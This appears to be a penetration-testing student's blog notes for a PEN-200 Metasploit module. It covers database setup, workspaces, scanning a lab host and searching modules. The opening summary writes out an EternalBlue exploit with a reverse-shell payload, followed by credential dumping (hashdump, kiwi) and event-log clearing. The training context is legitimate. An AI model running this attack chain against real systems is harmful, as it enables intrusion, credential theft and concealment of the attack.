---
title: "PEN-200 Module 20 \u2014 Metasploit With Restraint"
slug: metasploit
author: m4xx3d0ut
summary: 'Metasploit is invaluable when you treat it like any other engineering tool:
  scripted, logged, and explained. This pass adds the concrete procedures captured
  in the labs.'
publishedAt: '2023-11-18'
updatedAt: '2023-11-27'
readingMinutes: 124
tags:
- offsec
---
# PEN-200 Module 20 — Metasploit With Restraint

## TLDR;

Metasploit is invaluable when you treat it like any other engineering tool: scripted, logged, and explained. This pass adds the concrete procedures captured in the labs.

### Reconnaissance Modules

```
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.119.0/24
run

use auxiliary/scanner/http/title
set THREADS 20
run
```

- Export run results (`services -S smb -u`).
- Store workspace states: `workspace -a acme-internal` then `db_export -f xml acme-internal.xml` for backup.

### Exploitation Workflow

1. Load module → `show options` → set `RHOSTS`, `RPORT`, `PAYLOAD`, `LHOST`, `LPORT`.
2. Use `check` when available to confirm vulnerability.
3. Enable logging: `spool logs/acme-msf.log` before `run`.

```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.119.21
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 192.168.49.1
set EXITFUNC thread
run -j
```

- Record session IDs, pivot hosts, and post modules executed.

### Post-Exploitation Discipline

```
sessions -i 1
sysinfo
getuid
hashdump
load kiwi

run post/windows/gather/enum_logged_on_users
run post/multi/gather/enum_domain_group_users GROUP="Domain Admins"
```

- Dump loot into organised directories (`loot`, `download`).
- Clean up (`clearev`, `migrate`, `sessions -k <id>`) once tasks complete.

### Automation

- Resource scripts (`msfconsole -r scripts/acme_exploit.rc`) to reproduce module setups. Include comments and `sleep` commands when waiting for services.
- Metasploit RPC for integration:

```
msfrpcd -P supersecret -S
python3 metasploit_helper.py --module exploit/windows/http/struts2_content_type_ognl --rhosts 192.168.119.45
```

- Always store resource files and automation scripts in version control with timestamps.

### Operational Hygiene

- Disable `autopwn`, default payloads, and `Meterpreter` features not explicitly required by rules of engagement.
- Log every module you run, including unsuccessful ones, for transparency.

### Defensive Recommendations

- Provide patch KB references, disabling SMBv1, enabling RDP network-level authentication, etc.
- Supply detection ideas: unusual `svchost` behaviour, creation of service `%TEMP%\random.exe`, outbound HTTPS to C2 IP.

Metasploit should never be a black box. Script it, log it, and justify every module so the client gains confidence alongside the shell access you deliver.

## Working Notes... In Graphic Detail...

### The Metasploit Framework

- Getting Familiar with Metasploit.
- Using Metasploit Payloads.
- Performing Post-Exploitation with Metasploit.
- Automating Metasploit.

#### 20.1 Getting Familiar with Metasploit

- Setup and navigate Metasploit.
- Use auxiliary modules.
- Leverage exploit modules.

##### Setup and Work with MSF

MSF comes preinstalled on Kali but doesn't start its DB service in the default configuration.  Use of the DB is not mandatory, but there are compelling reasons to like storing info about target hosts and tracking successful exploitation attempts.  MSF uses PostgresSQL as a DB service, which is not active or enable on boot in Kali.

We can start, create, and initialize the MSF DB with `msfdb init`.
```
┌──(operator@labhost)-[~/OffSec/msf]
└─$ sudo msfdb init                                          
[sudo] password for operator: 
[+] Starting database
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
```

To enable the DB service at boot time we use `systemctl`.
```
┌──(operator@labhost)-[~/OffSec/msf]
└─$ sudo systemctl enable postgresql   
Synchronizing state of postgresql.service with SysV service script with /lib/systemd/systemd-sysv-install.
Executing: /lib/systemd/systemd-sysv-install enable postgresql
Created symlink /etc/systemd/system/multi-user.target.wants/postgresql.service → /lib/systemd/system/postgresql.service.
```

Launch the Metasploit CLI with `msfconsole`.
```
┌──(operator@labhost)-[~/OffSec/msf]
└─$ sudo msfconsole                 
                                                  
### cowsay++
 ____________
< metasploit >
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *


       =[ metasploit v6.3.31-dev                          ]
+ -- --=[ 2346 exploits - 1220 auxiliary - 413 post       ]
+ -- --=[ 1388 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Search can apply complex filters such as 
search cve:2009 type:exploit, see all the filters 
with help search
Metasploit Documentation: https://docs.metasploit.com/

msf6 >
```
- Hide the banner and version info on start up with `-q`

Once the CLI has started we can verify the DB connectivity with `db_status`.
```
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
```
- The DB is connected and we are all setup.

The CLI of MSF provides numerous commands to navigate the framework, divided into [categories](https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/).  The categories consist of Core Commands, Module Commands, Job Commands, Resource Script Commands, Database Backend Commands, Credentials Backend Commands, and Developer Commands.

We can list all available commands by entering `help`.
```
msf6 > help

Core Commands
=============

    Command       Description
    -------       -----------
    ?             Help menu
    banner        Display an awesome metasploit banner
    cd            Change the current working directory
    color         Toggle color
    connect       Communicate with a host
    debug         Display information useful for debugging
    exit          Exit the console
    features      Display the list of not yet released features that can be opted in to
    get           Gets the value of a context-specific variable
    getg          Gets the value of a global variable
    grep          Grep the output of another command
    help          Help menu
    history       Show command history
    load          Load a framework plugin
    quit          Exit the console
    repeat        Repeat a list of commands
    route         Route traffic through a session
    save          Saves the active datastores
    sessions      Dump session listings and display information about sessions
    set           Sets a context-specific variable to a value
    setg          Sets a global variable to a value
    sleep         Do nothing for the specified number of seconds
    spool         Write console output into a file as well the screen
    threads       View and manipulate background threads
    tips          Show a list of useful productivity tips
    unload        Unload a framework plugin
    unset         Unsets one or more context-specific variables
    unsetg        Unsets one or more global variables
    version       Show the framework and console library version numbers


Module Commands
===============

    Command       Description
    -------       -----------
    advanced      Displays advanced options for one or more modules
    back          Move back from the current context
    clearm        Clear the module stack
    favorite      Add module(s) to the list of favorite modules
    favorites     Print the list of favorite modules (alias for `show favorites`)
    info          Displays information about one or more modules
    listm         List the module stack
    loadpath      Searches for and loads modules from a path
    options       Displays global options or for one or more modules
    popm          Pops the latest module off the stack and makes it active
    previous      Sets the previously loaded module as the current module
    pushm         Pushes the active or list of modules onto the module stack
    reload_all    Reloads all modules from all defined module paths
    search        Searches module names and descriptions
    show          Displays modules of a given type, or all modules
    use           Interact with a module by name or search term/index


Job Commands
============

    Command       Description
    -------       -----------
    handler       Start a payload handler as job
    jobs          Displays and manages jobs
    kill          Kill a job
    rename_job    Rename a job


Resource Script Commands
========================

    Command       Description
    -------       -----------
    makerc        Save commands entered since start to a file
    resource      Run the commands stored in a file


Database Backend Commands
=========================

    Command       Description
    -------       -----------
    analyze       Analyze database information about a specific address or address rang
                  e
    db_connect    Connect to an existing data service
    db_disconnec  Disconnect from the current data service
    t
    db_export     Export a file containing the contents of the database
    db_import     Import a scan result file (filetype will be auto-detected)
    db_nmap       Executes nmap and records the output automatically
    db_rebuild_c  Rebuilds the database-stored module cache (deprecated)
    ache
    db_remove     Remove the saved data service entry
    db_save       Save the current data service connection as the default to reconnect
                  on startup
    db_status     Show the current data service status
    hosts         List all hosts in the database
    klist         List Kerberos tickets in the database
    loot          List all loot in the database
    notes         List all notes in the database
    services      List all services in the database
    vulns         List all vulnerabilities in the database
    workspace     Switch between database workspaces


Credentials Backend Commands
============================

    Command       Description
    -------       -----------
    creds         List all credentials in the database


Developer Commands
==================

    Command       Description
    -------       -----------
    edit          Edit the current module or a file with the preferred editor
    irb           Open an interactive Ruby shell in the current context
    log           Display framework.log paged to the end if possible
    pry           Open the Pry debugger on the current module or Framework
    reload_lib    Reload Ruby library files from specified paths
    time          Time how long it takes to run a particular command


msfconsole
==========

`msfconsole` is the primary interface to Metasploit Framework. There is quite a
lot that needs go here, please be patient and keep an eye on this space!

Building ranges and lists
-------------------------

Many commands and options that take a list of things can use ranges to avoid
having to manually list each desired thing. All ranges are inclusive.

##### Ranges of IDs

Commands that take a list of IDs can use ranges to help. Individual IDs must be
separated by a `,` (no space allowed) and ranges can be expressed with either
`-` or `..`.

##### Ranges of IPs

There are several ways to specify ranges of IP addresses that can be mixed
together. The first way is a list of IPs separated by just a ` ` (ASCII space),
with an optional `,`. The next way is two complete IP addresses in the form of
`BEGINNING_ADDRESS-END_ADDRESS` like `127.0.1.44-127.0.2.33`. CIDR
specifications may also be used, however the whole address must be given to
Metasploit like `127.0.0.0/8` and not `127/8`, contrary to the RFC.
Additionally, a netmask can be used in conjunction with a domain name to
dynamically resolve which block to target. All these methods work for both IPv4
and IPv6 addresses. IPv4 addresses can also be specified with special octet
ranges from the [NMAP target
specification](https://nmap.org/book/man-target-specification.html)

##### Examples

Terminate the first sessions:

    sessions -k 1

Stop some extra running jobs:

    jobs -k 2-6,7,8,11..15

Check a set of IP addresses:

    check 127.168.0.0/16, 127.0.0-2.1-4,15 127.0.0.255

Target a set of IPv6 hosts:

    set RHOSTS fe80::3990:0000/110, ::1-::f0f0

Target a block from a resolved domain name:

    set RHOSTS www.example.test/24
```

Before jumping into operations in MSF, let's discuss workspaces.  Assume we have performed a pentest and Metasploit stored all info about our target and infrastructure in the database.  When we start the next pentest that info will still be in the DB, to avoid mixing assessment results we can use workspaces.

The MSF `workspace` command lists all previously created workspaces, we can switch them by adding the name to the command.  To create a new workspace provide the name as an argument to `-a`.

Create a workspace name `pen200` for us to store the results of this section.
```
msf6 > workspace
* default
msf6 > workspace -a pen200
[*] Added workspace: pen200
[*] Workspace: pen200
msf6 > workspace
  default
* pen200
```

Once created, Metasploit will use it as a current workspace.

Let's populate the DB and familiarize ourselves with some of the Databse Backend Commands.  We can scan BRUTE2 with `db_nmap` which is a wrapper to execute Nmap inside Metasploit and save the finding to the DB.  The command syntax is identical to Nmap.
```
msf6 > db_nmap
[*] Usage: db_nmap [--save | [--help | -h]] [nmap options]
msf6 > db_nmap -A 192.168.197.202
[*] Nmap: Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-19 14:40 PST
[*] Nmap: Nmap scan report for 192.168.197.202
[*] Nmap: Host is up (0.076s latency).
[*] Nmap: Not shown: 994 closed tcp ports (reset)
[*] Nmap: PORT     STATE SERVICE       VERSION
[*] Nmap: 21/tcp   open  ftp?
[*] Nmap: | ftp-syst:
[*] Nmap: |_  SYST: UNIX emulated by FileZilla.
[*] Nmap: |_ssl-date: TLS randomness does not represent time
[*] Nmap: | fingerprint-strings:
[*] Nmap: |   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, NULL, RPCCheck, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
[*] Nmap: |     220-FileZilla Server 1.4.1
[*] Nmap: |     Please visit https://filezilla-project.org/
[*] Nmap: |   GetRequest:
[*] Nmap: |     220-FileZilla Server 1.4.1
[*] Nmap: |     Please visit https://filezilla-project.org/
[*] Nmap: |     What are you trying to do? Go away.
[*] Nmap: |   HTTPOptions, RTSPRequest:
[*] Nmap: |     220-FileZilla Server 1.4.1
[*] Nmap: |     Please visit https://filezilla-project.org/
[*] Nmap: |     Wrong command.
[*] Nmap: |   Help:
[*] Nmap: |     220-FileZilla Server 1.4.1
[*] Nmap: |     Please visit https://filezilla-project.org/
[*] Nmap: |     214-The following commands are recognized.
[*] Nmap: |     USER TYPE SYST SIZE RNTO RNFR RMD REST QUIT
[*] Nmap: |     HELP XMKD MLST MKD EPSV XCWD NOOP AUTH OPTS DELE
[*] Nmap: |     CDUP APPE STOR ALLO RETR PWD FEAT CLNT MFMT
[*] Nmap: |     MODE XRMD PROT ADAT ABOR XPWD MDTM LIST MLSD PBSZ
[*] Nmap: |     NLST EPRT PASS STRU PASV STAT PORT
[*] Nmap: |_    Help ok.
[*] Nmap: | ssl-cert: Subject: commonName=filezilla-server self signed certificate
[*] Nmap: | Not valid before: 2022-06-20T21:11:52
[*] Nmap: |_Not valid after:  2023-06-21T21:16:52
[*] Nmap: 135/tcp  open  msrpc         Microsoft Windows RPC
[*] Nmap: 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp  open  microsoft-ds?
[*] Nmap: 3389/tcp open  ms-wbt-server Microsoft Terminal Services
[*] Nmap: | rdp-ntlm-info:
[*] Nmap: |   Target_Name: BRUTE2
[*] Nmap: |   NetBIOS_Domain_Name: BRUTE2
[*] Nmap: |   NetBIOS_Computer_Name: BRUTE2
[*] Nmap: |   DNS_Domain_Name: BRUTE2
[*] Nmap: |   DNS_Computer_Name: BRUTE2
[*] Nmap: |   Product_Version: 10.0.20348
[*] Nmap: |_  System_Time: 2023-11-19T22:41:10+00:00
[*] Nmap: | ssl-cert: Subject: commonName=BRUTE2
[*] Nmap: | Not valid before: 2023-11-10T06:26:57
[*] Nmap: |_Not valid after:  2024-05-11T06:26:57
[*] Nmap: |_ssl-date: 2023-11-19T22:41:19+00:00; 0s from scanner time.
[*] Nmap: 8000/tcp open  http          Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
[*] Nmap: |_http-title: Beta App Template
[*] Nmap: 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
[*] Nmap: SF-Port21-TCP:V=7.94%I=7%D=11/19%Time=655A8EDA%P=x86_64-pc-linux-gnu%r(NUL
[*] Nmap: SF:L,4D,"220-FileZilla\x20Server\x201\.4\.1\r\n220\x20Please\x20visit\x20h
[*] Nmap: SF:ttps://filezilla-project\.org/\r\n")%r(GenericLines,4D,"220-FileZilla\x
[*] Nmap: SF:20Server\x201\.4\.1\r\n220\x20Please\x20visit\x20https://filezilla-proj
[*] Nmap: SF:ect\.org/\r\n")%r(Help,17C,"220-FileZilla\x20Server\x201\.4\.1\r\n220\x
[*] Nmap: SF:20Please\x20visit\x20https://filezilla-project\.org/\r\n214-The\x20foll
[*] Nmap: SF:owing\x20commands\x20are\x20recognized\.\r\n\x20NOP\x20\x20USER\x20TYPE
[*] Nmap: SF:\x20SYST\x20SIZE\x20RNTO\x20RNFR\x20RMD\x20\x20REST\x20QUIT\r\n\x20HELP
[*] Nmap: SF:\x20XMKD\x20MLST\x20MKD\x20\x20EPSV\x20XCWD\x20NOOP\x20AUTH\x20OPTS\x20
[*] Nmap: SF:DELE\r\n\x20CWD\x20\x20CDUP\x20APPE\x20STOR\x20ALLO\x20RETR\x20PWD\x20\
[*] Nmap: SF:x20FEAT\x20CLNT\x20MFMT\r\n\x20MODE\x20XRMD\x20PROT\x20ADAT\x20ABOR\x20
[*] Nmap: SF:XPWD\x20MDTM\x20LIST\x20MLSD\x20PBSZ\r\n\x20NLST\x20EPRT\x20PASS\x20STR
[*] Nmap: SF:U\x20PASV\x20STAT\x20PORT\r\n214\x20Help\x20ok\.\r\n")%r(GetRequest,76,
[*] Nmap: SF:"220-FileZilla\x20Server\x201\.4\.1\r\n220\x20Please\x20visit\x20https:
[*] Nmap: SF://filezilla-project\.org/\r\n501\x20What\x20are\x20you\x20trying\x20to\
[*] Nmap: SF:x20do\?\x20Go\x20away\.\r\n")%r(HTTPOptions,61,"220-FileZilla\x20Server
[*] Nmap: SF:\x201\.4\.1\r\n220\x20Please\x20visit\x20https://filezilla-project\.org
[*] Nmap: SF:/\r\n500\x20Wrong\x20command\.\r\n")%r(RTSPRequest,61,"220-FileZilla\x2
[*] Nmap: SF:0Server\x201\.4\.1\r\n220\x20Please\x20visit\x20https://filezilla-proje
[*] Nmap: SF:ct\.org/\r\n500\x20Wrong\x20command\.\r\n")%r(RPCCheck,4D,"220-FileZill
[*] Nmap: SF:a\x20Server\x201\.4\.1\r\n220\x20Please\x20visit\x20https://filezilla-p
[*] Nmap: SF:roject\.org/\r\n")%r(DNSVersionBindReqTCP,4D,"220-FileZilla\x20Server\x
[*] Nmap: SF:201\.4\.1\r\n220\x20Please\x20visit\x20https://filezilla-project\.org/\
[*] Nmap: SF:r\n")%r(DNSStatusRequestTCP,4D,"220-FileZilla\x20Server\x201\.4\.1\r\n2
[*] Nmap: SF:20\x20Please\x20visit\x20https://filezilla-project\.org/\r\n")%r(SSLSes
[*] Nmap: SF:sionReq,4D,"220-FileZilla\x20Server\x201\.4\.1\r\n220\x20Please\x20visi
[*] Nmap: SF:t\x20https://filezilla-project\.org/\r\n")%r(TerminalServerCookie,4D,"2
[*] Nmap: SF:20-FileZilla\x20Server\x201\.4\.1\r\n220\x20Please\x20visit\x20https://
[*] Nmap: SF:filezilla-project\.org/\r\n")%r(TLSSessionReq,4D,"220-FileZilla\x20Serv
[*] Nmap: SF:er\x201\.4\.1\r\n220\x20Please\x20visit\x20https://filezilla-project\.o
[*] Nmap: SF:rg/\r\n");
[*] Nmap: No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
[*] Nmap: TCP/IP fingerprint:
[*] Nmap: OS:SCAN(V=7.94%E=4%D=11/19%OT=21%CT=1%CU=41424%PV=Y%DS=4%DC=T%G=Y%TM=655A8F
[*] Nmap: OS:10%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10F%TI=I%TS=A)OPS(O1=M551N
[*] Nmap: OS:W8ST11%O2=M551NW8ST11%O3=M551NW8NNT11%O4=M551NW8ST11%O5=M551NW8ST11%O6=M
[*] Nmap: OS:551ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y
[*] Nmap: OS:%T=80%W=FFFF%O=M551NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=
[*] Nmap: OS:)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R
[*] Nmap: OS:=N)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=A3F1%R
[*] Nmap: OS:UD=G)IE(R=N)
[*] Nmap: Network Distance: 4 hops
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Host script results:
[*] Nmap: | smb2-security-mode:
[*] Nmap: |   3:1:1:
[*] Nmap: |_    Message signing enabled but not required
[*] Nmap: | smb2-time:
[*] Nmap: |   date: 2023-11-19T22:41:15
[*] Nmap: |_  start_date: N/A
[*] Nmap: TRACEROUTE (using port 53/tcp)
[*] Nmap: HOP RTT      ADDRESS
[*] Nmap: 1   76.18 ms 192.168.45.1
[*] Nmap: 2   76.15 ms 192.168.45.254
[*] Nmap: 3   76.20 ms 192.168.251.1
[*] Nmap: 4   76.25 ms 192.168.197.202
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 62.80 seconds
```
- If the DB service is running, Metasploit will log findings and info about discovered hosts, services, or credentials in a convenient, accessible database.

To list all discovered hosts we can enter `hosts`.
```
msf6 > hosts

Hosts
=====

address       mac  name  os_name       os_flavor  os_sp  purpose  info  comments
-------       ---  ----  -------       ---------  -----  -------  ----  --------
192.168.197.             Windows 2022                    server
202
```

Enter `services` to display the discovered services from our port scan, we can filter for specific port number by providing it as an argument to `-p`.
```
msf6 > services
Services
========

host          port  proto  name           state  info
----          ----  -----  ----           -----  ----
192.168.197.  21    tcp    ftp            open
202
192.168.197.  135   tcp    msrpc          open   Microsoft Windows RPC
202
192.168.197.  139   tcp    netbios-ssn    open   Microsoft Windows netbios-ssn
202
192.168.197.  445   tcp    microsoft-ds   open
202
192.168.197.  3389  tcp    ms-wbt-server  open   Microsoft Terminal Services
202
192.168.197.  8000  tcp    http           open   Golang net/http server Go-IPFS json-rp
202                                              c or InfluxDB API

msf6 > services -p 8000
Services
========

host          port  proto  name  state  info
----          ----  -----  ----  -----  ----
192.168.197.  8000  tcp    http  open   Golang net/http server Go-IPFS json-rpc or Infl
202                                     uxDB API
```
- See all discovered services up to this point.
- Quickly identify all hosts with a specific service running.

When working with numerous target systems during an assessment, the Database Backend Commands are invaluable in identifying important info and discovering potential attack vectors.  Results stored in the DB can also be used as input to modules, which we will discuss in the next section.

Let's briefly review modules again, modules are used to perform tasks in Metasploit such as scanning or exploiting targets.  The framework includes several thousand modules divided into categories.

The categories are displayed on the splash screen summary and can be viewed with the `show -h` command.
```
msf6 > show -h
[*] Valid parameters for the "show" command are: all, encoders, nops, exploits, payloads, auxiliary, post, plugins, info, options, favorites
[*] Additional module-specific parameters are: missing, advanced, evasion, targets, actions
```
- Shows the categories of the Metasploit modules.

To activate a module we enter the `use` command with the module name.  The modules all follow a common slash-delimeted hierarchal syntax.
- `module type/os`
- `vendor`
- `app`
- `operation`
- `protocol/module name`
This makes it easy to explore and use modules.  We will explore auxiliary modules in the next section and then dive into exploit modules.

##### Auxiliary Modules

MSF includes hundreds of auxiliary modules, priving functionality such as proto enum, port scanning, fuzzing, sniffing, and more.  Aux mods are useful for many tasks including info gathering (under the gather/hierarchy), and so on.

There are too many to cover, but we will demonstrate the syntax and operation of two very common auxiliary modules.  To list all aux mods, we can run the `show auxiliary` command.  This presents us with a long list of all aux mods.
```
msf6 > show auxiliary

Auxiliary
=========

   #     Name                                                                     Disclosure Date  Rank    Check  Description
   -     ----                                                                     ---------------  ----    -----  -----------
   0     auxiliary/admin/2wire/xslt_password_reset                                2007-08-15       normal  No     2Wire Cross-Site Request Forgery Password Reset Vulnerability
   1     auxiliary/admin/android/google_play_store_uxss_xframe_rce                                 normal  No     Android Browser RCE Through Google Play Store XFO
   2     auxiliary/admin/appletv/appletv_display_image                                             normal  No     Apple TV Image Remote Control
   3     auxiliary/admin/appletv/appletv_display_video                                             normal  No     Apple TV Video Remote Control
   4     auxiliary/admin/atg/atg_client                                                            normal  No     Veeder-Root Automatic Tank Gauge (ATG) Administrative Client
   5     auxiliary/admin/aws/aws_launch_instances                                                  normal  No     Launches Hosts in AWS
   6     auxiliary/admin/backupexec/dump                                                           normal  No     Veritas Backup Exec Windows Remote File Access
   7     auxiliary/admin/backupexec/registry                                                       normal  No     Veritas Backup Exec Server Registry Access
   8     auxiliary/admin/chromecast/chromecast_reset                                               normal  No     Chromecast Factory Reset DoS
   9     auxiliary/admin/chromecast/chromecast_youtube                                             normal  No     Chromecast YouTube Remote Control
...
```

We can use `search` to reduce the output considerably, filtering by app, type, CVE ID, operation, platform, and more.  In this example, we want to obtain the SMB version of the previously scanned system BRUTE2 by using a Metasploit aux mod.

To find the correct mod we can search all SMB aux mods with `search type:auxiliary smb`
```
msf6 > search type:auxiliary smb

Matching Modules
================

   #   Name                                                            Disclosure Date  Rank    Check  Description
   -   ----                                                            ---------------  ----    -----  -----------
   0   auxiliary/server/capture/smb                                                     normal  No     Authentication Capture: SMB
   1   auxiliary/scanner/http/citrix_dir_traversal                     2019-12-17       normal  No     Citrix ADC (NetScaler) Directory Traversal Scanner
   2   auxiliary/scanner/smb/impacket/dcomexec                         2018-03-19       normal  No     DCOM Exec
   3   auxiliary/scanner/smb/impacket/secretsdump                                       normal  No     DCOM Exec
   4   auxiliary/scanner/dcerpc/dfscoerce                                               normal  No     DFSCoerce
   5   auxiliary/server/http_ntlmrelay                                                  normal  No     HTTP Client MS Credential Relayer
   6   auxiliary/gather/konica_minolta_pwd_extract                                      normal  No     Konica Minolta Password Extractor
   7   auxiliary/fileformat/odt_badodt                                 2018-05-01       normal  No     LibreOffice 6.03 /Apache OpenOffice 4.1.5 Malicious ODT File Generator
   8   auxiliary/admin/smb/ms17_010_command                            2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   9   auxiliary/scanner/smb/smb_ms17_010                                               normal  No     MS17-010 SMB RCE Detection
   10  auxiliary/dos/windows/smb/ms05_047_pnp                                           normal  No     Microsoft Plug and Play Service Registry Overflow
   11  auxiliary/dos/windows/smb/rras_vls_null_deref                   2006-06-14       normal  No     Microsoft RRAS InterfaceAdjustVLSPointers NULL Dereference
   12  auxiliary/admin/mssql/mssql_ntlm_stealer                                         normal  No     Microsoft SQL Server NTLM Stealer
   13  auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                                    normal  No     Microsoft SQL Server SQLi NTLM Stealer
   14  auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli                            normal  No     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
   15  auxiliary/admin/mssql/mssql_enum_domain_accounts                                 normal  No     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
   16  auxiliary/dos/windows/smb/ms06_035_mailslot                     2006-07-11       normal  No     Microsoft SRV.SYS Mailslot Write Corruption
   17  auxiliary/dos/windows/smb/ms06_063_trans                                         normal  No     Microsoft SRV.SYS Pipe Transaction No Null
   18  auxiliary/dos/windows/smb/ms09_001_write                                         normal  No     Microsoft SRV.SYS WriteAndX Invalid DataOffset
   19  auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh                        normal  No     Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
   20  auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff                           normal  No     Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference
   21  auxiliary/dos/windows/smb/vista_negotiate_stop                                   normal  No     Microsoft Vista SP0 SMB Negotiate Protocol DoS
   22  auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop                       normal  No     Microsoft Windows 7 / Server 2008 R2 SMB Client Infinite Loop
   23  auxiliary/scanner/smb/psexec_loggedin_users                                      normal  No     Microsoft Windows Authenticated Logged In Users Enumeration
   24  auxiliary/dos/windows/smb/ms11_019_electbowser                                   normal  No     Microsoft Windows Browser Pool DoS
   25  auxiliary/dos/windows/smb/ms10_054_queryfs_pool_overflow                         normal  No     Microsoft Windows SRV.SYS SrvSmbQueryFsInformation Pool Overflow DoS
   26  auxiliary/docx/word_unc_injector                                                 normal  No     Microsoft Word UNC Path Injector
   27  auxiliary/spoof/nbns/nbns_response                                               normal  No     NetBIOS Name Service Spoofer
   28  auxiliary/admin/oracle/ora_ntlm_stealer                         2009-04-07       normal  No     Oracle SMB Relay Code Execution
   29  auxiliary/scanner/dcerpc/petitpotam                                              normal  No     PetitPotam
   30  auxiliary/admin/smb/psexec_ntdsgrab                                              normal  No     PsExec NTDS.dit And SYSTEM Hive Download Utility
   31  auxiliary/scanner/sap/sap_smb_relay                                              normal  No     SAP SMB Relay Abuse
   32  auxiliary/dos/sap/sap_soap_rfc_eps_delete_file                                   normal  No     SAP SOAP EPS_DELETE_FILE File Deletion
   33  auxiliary/scanner/sap/sap_soap_rfc_eps_get_directory_listing                     normal  No     SAP SOAP RFC EPS_GET_DIRECTORY_LISTING Directories Information Disclosure
   34  auxiliary/scanner/sap/sap_soap_rfc_pfl_check_os_file_existence                   normal  No     SAP SOAP RFC PFL_CHECK_OS_FILE_EXISTENCE File Existence Check
   35  auxiliary/scanner/sap/sap_soap_rfc_rzl_read_dir                                  normal  No     SAP SOAP RFC RZL_READ_DIR_LOCAL Directory Contents Listing
   36  auxiliary/fuzzers/smb/smb_create_pipe_corrupt                                    normal  No     SMB Create Pipe Request Corruption
   37  auxiliary/fuzzers/smb/smb_create_pipe                                            normal  No     SMB Create Pipe Request Fuzzer
   38  auxiliary/admin/smb/list_directory                                               normal  No     SMB Directory Listing Utility
   39  auxiliary/scanner/smb/smb_enumusers_domain                                       normal  No     SMB Domain User Enumeration
   40  auxiliary/admin/smb/delete_file                                                  normal  No     SMB File Delete Utility
   41  auxiliary/admin/smb/download_file                                                normal  No     SMB File Download Utility
   42  auxiliary/admin/smb/upload_file                                                  normal  No     SMB File Upload Utility
   43  auxiliary/scanner/smb/smb_enum_gpp                                               normal  No     SMB Group Policy Preference Saved Passwords Enumeration
   44  auxiliary/scanner/smb/smb_login                                                  normal  No     SMB Login Check Scanner
   45  auxiliary/fuzzers/smb/smb_ntlm1_login_corrupt                                    normal  No     SMB NTLMv1 Login Request Corruption
   46  auxiliary/fuzzers/smb/smb_negotiate_corrupt                                      normal  No     SMB Negotiate Dialect Corruption
   47  auxiliary/fuzzers/smb/smb2_negotiate_corrupt                                     normal  No     SMB Negotiate SMB2 Dialect Corruption
   48  auxiliary/scanner/smb/smb_lookupsid                                              normal  No     SMB SID User Enumeration (LookupSid)
   49  auxiliary/admin/smb/check_dir_file                                               normal  No     SMB Scanner Check File/Directory Utility
   50  auxiliary/scanner/smb/pipe_auditor                                               normal  No     SMB Session Pipe Auditor
   51  auxiliary/scanner/smb/pipe_dcerpc_auditor                                        normal  No     SMB Session Pipe DCERPC Auditor
   52  auxiliary/scanner/smb/smb_enumshares                                             normal  No     SMB Share Enumeration
   53  auxiliary/fuzzers/smb/smb_tree_connect_corrupt                                   normal  No     SMB Tree Connect Request Corruption
   54  auxiliary/fuzzers/smb/smb_tree_connect                                           normal  No     SMB Tree Connect Request Fuzzer
   55  auxiliary/scanner/smb/smb_enumusers                                              normal  No     SMB User Enumeration (SAM EnumUsers)
   56  auxiliary/scanner/smb/smb_version                                                normal  No     SMB Version Detection
   57  auxiliary/dos/smb/smb_loris                                     2017-06-29       normal  No     SMBLoris NBSS Denial of Service
   58  auxiliary/scanner/snmp/snmp_enumshares                                           normal  No     SNMP Windows SMB Share Enumeration
   59  auxiliary/admin/smb/samba_symlink_traversal                                      normal  No     Samba Symlink Directory Traversal
   60  auxiliary/scanner/smb/smb_uninit_cred                                            normal  Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State
   61  auxiliary/dos/samba/read_nttrans_ea_list                                         normal  No     Samba read_nttrans_ea_list Integer Overflow
   62  auxiliary/server/teamviewer_uri_smb_redirect                                     normal  No     TeamViewer Unquoted URI Handler SMB Redirect
   63  auxiliary/scanner/smb/impacket/wmiexec                          2018-03-19       normal  No     WMI Exec
   64  auxiliary/admin/smb/webexec_command                                              normal  No     WebEx Remote Command Execution Utility
   65  auxiliary/fileformat/multidrop                                                   normal  No     Windows SMB Multi Dropper


